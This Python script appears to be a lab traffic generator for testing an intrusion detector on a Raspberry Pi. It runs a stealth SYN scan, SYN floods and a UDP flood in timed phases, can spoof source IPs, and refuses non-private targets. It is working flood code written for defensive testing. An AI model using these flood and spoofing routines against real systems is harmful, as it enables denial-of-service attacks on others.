"""Gradual Attack Traffic Simulator with Intervals and Pauses

Simulates a sophisticated attacker who gradually escalates attack intensity
with pauses to evade detection. Tests the model's ability to detect evolving
threats and its recovery behavior during attack pauses.

Usage:
    python gradual_attack_intervals.py --target <PI_IP> --duration 300

Characteristics:
- Starts with low-rate probing (stealth reconnaissance)
- Gradually increases to moderate then high-intensity flood
- Pauses between attack phases (recovery testing)
- Optional IP rotation for multi-source simulation
- Should trigger THROTTLE → BLOCK → RELEASE cycle on dashboard

WARNING: This script sends attack traffic for TESTING ONLY.
Only use against systems you own in a controlled lab environment.
"""

import argparse
import os
import random
import socket
import sys
import time
from pathlib import Path

try:
    from scapy.all import IP, TCP, UDP, send
    SCAPY = True
except ImportError:
    SCAPY = False


def require_scapy() -> bool:
    """Check if scapy is available for crafted packets."""
    if SCAPY:
        return True
    print("[WARN] Scapy not available - falling back to connect-based attacks")
    print("[WARN] Install scapy for raw SYN packet support: pip install scapy")
    return False


def send_scapy_packet(pkt) -> bool:
    """Send a crafted packet; return False if failed."""
    try:
        send(pkt, verbose=False)
        return True
    except (PermissionError, OSError) as err:
        print(f"[ERROR] Raw packet send failed ({err.__class__.__name__})")
        print("[ERROR] On Windows: run as Administrator + install Npcap")
        print("[ERROR] On Linux/Pi: run with sudo")
        return False


def make_fake_ips(count: int) -> list[str]:
    """Generate fake source IP addresses."""
    return [f"10.{random.randint(50, 250)}.{random.randint(1, 254)}.{random.randint(2, 254)}" 
            for _ in range(count)]


def attack_phase_stealth(args, duration: float, phase_name: str) -> None:
    """Phase 1: Low-and-slow stealth reconnaissance scan."""
    print(f"\n  {'='*65}")
    print(f"  PHASE: {phase_name}")
    print(f"  Type: Stealth port scan (low-and-slow)")
    print(f"  Duration: {duration:.0f}s")
    print(f"  Expected: Occasional SUSPICIOUS, maybe brief THROTTLE")
    print(f"  {'='*65}\n")
    
    stop_at = time.monotonic() + duration
    
    if require_scapy():
        # Slow SYN probes across multiple ports
        ports = [22, 23, 80, 443, 1883, 5353, 8080, 8883, 9000, 3306, 5432, 6379]
        sources = make_fake_ips(args.sources) if args.sources > 0 else [None]
        
        sent = 0
        while time.monotonic() < stop_at:
            src = random.choice(sources) if sources[0] else None
            dport = random.choice(ports)
            sport = random.randint(40000, 60000)
            
            pkt = IP(dst=args.target) / TCP(sport=sport, dport=dport, flags="S", seq=random.randint(0, 2**31))
            if src:
                pkt[IP].src = src
            
            if not send_scapy_packet(pkt):
                return
            
            sent += 1
            if sent % 20 == 0:
                print(f"    [Stealth] Sent {sent} probes...")
            
            time.sleep(random.uniform(0.8, 2.0))  # Very slow
    else:
        # Fallback: slow connect scan
        ports = range(20, 200, 5)
        while time.monotonic() < stop_at:
            for p in random.sample(list(ports), 3):
                try:
                    s = socket.socket()
                    s.settimeout(0.2)
                    s.connect_ex((args.target, p))
                    s.close()
                except OSError:
                    pass
            time.sleep(1.5)
    
    print(f"  [Stealth] Phase completed\n")


def attack_phase_moderate(args, duration: float, phase_name: str) -> None:
    """Phase 2: Moderate-rate SYN flood."""
    print(f"\n  {'='*65}")
    print(f"  PHASE: {phase_name}")
    print(f"  Type: Moderate SYN flood")
    print(f"  Rate: 100-150 pps")
    print(f"  Duration: {duration:.0f}s")
    print(f"  Expected: THROTTLE warning, possible BLOCK")
    print(f"  {'='*65}\n")
    
    stop_at = time.monotonic() + duration
    
    if require_scapy():
        sources = make_fake_ips(args.sources) if args.sources > 0 else [None]
        rate = random.randint(100, 150)
        interval = 1.0 / rate
        
        sent = 0
        while time.monotonic() < stop_at:
            src = random.choice(sources) if sources[0] else None
            pkt = IP(dst=args.target) / TCP(
                sport=random.randint(30000, 65000),
                dport=args.port,
                flags="S",
                seq=random.randint(0, 2**31),
                window=512
            )
            if src:
                pkt[IP].src = src
            
            if not send_scapy_packet(pkt):
                return
            
            sent += 1
            if sent % 100 == 0:
                print(f"    [Moderate] Sent {sent} SYN packets...")
                time.sleep(max(0.0, 100 * interval - 0.01))
    else:
        # Fallback: rapid connect attempts
        rate = 50  # Lower for socket-based
        interval = 1.0 / rate
        sent = 0
        while time.monotonic() < stop_at:
            try:
                s = socket.socket()
                s.setblocking(False)
                s.connect_ex((args.target, args.port))
                s.close()
            except OSError:
                pass
            
            sent += 1
            if sent % 50 == 0:
                time.sleep(max(0.0, 50 * interval))
    
    print(f"  [Moderate] Phase completed\n")


def attack_phase_intense(args, duration: float, phase_name: str) -> None:
    """Phase 3: High-intensity SYN flood."""
    print(f"\n  {'='*65}")
    print(f"  PHASE: {phase_name}")
    print(f"  Type: High-intensity SYN flood")
    print(f"  Rate: 350-500 pps")
    print(f"  Duration: {duration:.0f}s")
    print(f"  Expected: BLOCK (red banner, DROP rule)")
    print(f"  {'='*65}\n")
    
    stop_at = time.monotonic() + duration
    
    if require_scapy():
        sources = make_fake_ips(args.sources) if args.sources > 0 else [None]
        rate = random.randint(350, 500)
        interval = 1.0 / rate
        
        sent = 0
        burst_size = 20
        
        while time.monotonic() < stop_at:
            for _ in range(burst_size):
                src = random.choice(sources) if sources[0] else None
                pkt = IP(dst=args.target) / TCP(
                    sport=random.randint(30000, 65000),
                    dport=args.port,
                    flags="S",
                    seq=random.randint(0, 2**31),
                    window=512
                )
                if src:
                    pkt[IP].src = src
                
                if not send_scapy_packet(pkt):
                    return
                
                sent += 1
            
            if sent % 200 == 0:
                print(f"    [Intense] Sent {sent} SYN packets...")
            
            time.sleep(max(0.0, burst_size * interval - 0.005))
    else:
        # Fallback
        rate = 80
        interval = 1.0 / rate
        sent = 0
        while time.monotonic() < stop_at:
            for _ in range(10):
                try:
                    s = socket.socket()
                    s.setblocking(False)
                    s.connect_ex((args.target, args.port))
                    s.close()
                except OSError:
                    pass
                sent += 1
            
            if sent % 100 == 0:
                print(f"    [Intense] Sent {sent} connections...")
            
            time.sleep(max(0.0, 10 * interval))
    
    print(f"  [Intense] Phase completed\n")


def attack_phase_udp(args, duration: float, phase_name: str) -> None:
    """Phase 4: UDP flood burst."""
    print(f"\n  {'='*65}")
    print(f"  PHASE: {phase_name}")
    print(f"  Type: UDP flood")
    print(f"  Rate: 300-400 pps")
    print(f"  Duration: {duration:.0f}s")
    print(f"  Expected: BLOCK (UDP density rules 6/7 fire)")
    print(f"  {'='*65}\n")
    
    stop_at = time.monotonic() + duration
    
    if require_scapy():
        sources = make_fake_ips(args.sources) if args.sources > 0 else [None]
        rate = random.randint(300, 400)
        interval = 1.0 / rate
        
        sent = 0
        while time.monotonic() < stop_at:
            src = random.choice(sources) if sources[0] else None
            pkt = IP(dst=args.target) / UDP(
                sport=random.randint(30000, 65000),
                dport=random.choice([args.port, random.randint(1024, 65000)])
            ) / os.urandom(random.randint(8, 120))
            
            if src:
                pkt[IP].src = src
            
            if not send_scapy_packet(pkt):
                return
            
            sent += 1
            if sent % 200 == 0:
                print(f"    [UDP] Sent {sent} packets...")
                time.sleep(max(0.0, 200 * interval - 0.01))
    else:
        # Socket-based UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        rate = 200
        interval = 1.0 / rate
        payload = os.urandom(random.randint(32, 200))
        sent = 0
        
        while time.monotonic() < stop_at:
            try:
                sock.sendto(payload, (args.target, random.choice([args.port, 53, 1883])))
            except OSError:
                pass
            
            sent += 1
            if sent % 200 == 0:
                print(f"    [UDP] Sent {sent} packets...")
                time.sleep(max(0.0, 200 * interval))
        
        sock.close()
    
    print(f"  [UDP] Phase completed\n")


def pause_phase(duration: float, reason: str) -> None:
    """Pause between attack phases."""
    print(f"\n  {'='*65}")
    print(f"  PAUSE: {reason}")
    print(f"  Duration: {duration:.0f}s")
    print(f"  Expected: Detector should RELEASE blocked IPs after TTL")
    print(f"  {'='*65}\n")
    
    stop_at = time.monotonic() + duration
    while time.monotonic() < stop_at:
        remaining = stop_at - time.monotonic()
        if int(remaining) % 10 == 0 and remaining > 0:
            print(f"    [Pause] {remaining:.0f}s remaining...")
        time.sleep(1.0)
    
    print(f"  [Pause] Completed\n")


def run_simulation(args) -> None:
    """Main simulation orchestrator with gradual escalation."""
    print(f"\n{'='*70}")
    print("Gradual Attack Simulator with Intervals")
    print(f"{'='*70}")
    print(f"Target: {args.target}:{args.port}")
    print(f"Total duration: {args.duration}s")
    print(f"Source rotation: {args.sources} IPs" if args.sources > 0 else "No IP rotation")
    print(f"Scapy: {'Available' if SCAPY else 'NOT available (fallback mode)'}")
    print(f"{'='*70}")
    print("\nAttack storyline:")
    print("  1. Stealth reconnaissance (low-and-slow)")
    print("  2. PAUSE - Recovery observation")
    print("  3. Moderate SYN flood escalation")
    print("  4. PAUSE - Auto-release verification")
    print("  5. High-intensity burst")
    print("  6. PAUSE - Cool-down")
    print("  7. UDP flood variant")
    print("  8. Final recovery pause")
    print(f"{'='*70}\n")
    
    start_time = time.time()
    
    # Attack timeline (proportional to total duration)
    base = args.duration / 8.0  # 8 segments
    
    timeline = [
        ('stealth', attack_phase_stealth, base * 1.2, "Stealth Reconnaissance"),
        ('pause', pause_phase, base * 0.8, "Observing detector behavior"),
        ('moderate', attack_phase_moderate, base * 1.0, "Moderate Escalation"),
        ('pause', pause_phase, base * 1.2, "Waiting for auto-release"),
        ('intense', attack_phase_intense, base * 1.0, "High-Intensity Burst"),
        ('pause', pause_phase, base * 0.8, "Cool-down period"),
        ('udp', attack_phase_udp, base * 1.0, "UDP Flood Variant"),
        ('pause', pause_phase, base * 1.0, "Final recovery observation"),
    ]
    
    try:
        for phase_id, handler, duration, description in timeline:
            if phase_id == 'pause':
                pause_phase(duration, description)
            else:
                handler(args, duration, description)
    except KeyboardInterrupt:
        print("\n[STOP] Simulation interrupted by user")
    
    print(f"\n{'='*70}")
    print(f"Simulation completed. Total time: {time.time() - start_time:.1f}s")
    print("\nReview the dashboard to observe:")
    print("  - Threat score escalation across attack phases")
    print("  - THROTTLE → BLOCK transitions")
    print("  - Automatic IP release during pause phases")
    print("  - Fuzzy rule activations in the Explanation panel")
    print(f"{'='*70}\n")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Gradual Attack Traffic Simulator with Pauses (TESTING ONLY)"
    )
    parser.add_argument("--target", required=True, help="Target Pi IP (lab use only)")
    parser.add_argument("--port", type=int, default=80, help="Target port for flood")
    parser.add_argument("--duration", type=int, default=300, help="Total simulation duration (seconds)")
    parser.add_argument("--sources", type=int, default=8, help="Number of fake source IPs (requires scapy + admin)")
    
    args = parser.parse_args()
    
    # Safety check
    import ipaddress
    try:
        ip = ipaddress.ip_address(args.target)
        if not (ip.is_private or ip.is_loopback or ip.is_link_local):
            sys.exit(f"ERROR: Refusing to target non-private IP {args.target}. Lab use only!")
    except ValueError:
        sys.exit(f"ERROR: Invalid IP address: {args.target}")
    
    if not SCAPY and args.sources > 0:
        print("[WARN] Source rotation requires scapy - disabling")
        args.sources = 0
    
    if args.duration < 120:
        sys.exit("ERROR: Duration must be at least 120 seconds for meaningful phase timing")
    
    run_simulation(args)


if __name__ == "__main__":
    main()
